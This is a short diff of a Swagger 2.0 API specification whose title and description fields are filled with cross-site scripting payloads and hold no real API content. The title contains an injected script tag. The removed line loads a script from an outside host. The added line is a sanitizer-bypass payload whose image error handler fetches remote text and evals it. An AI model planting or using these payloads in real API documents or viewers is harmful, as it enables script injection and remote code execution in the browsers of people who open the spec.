@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: TESTED<svg><!--?php "--><script>confirm(1)</script>?&gt;</svg>
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea>"><script src=//xss.kebumian.site></script>">
+       <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=fetch('2').then(function(res){res.text().then(function(data){eval(data)})}) src=1>"></form>
 paths:
   /accounts:
     get:
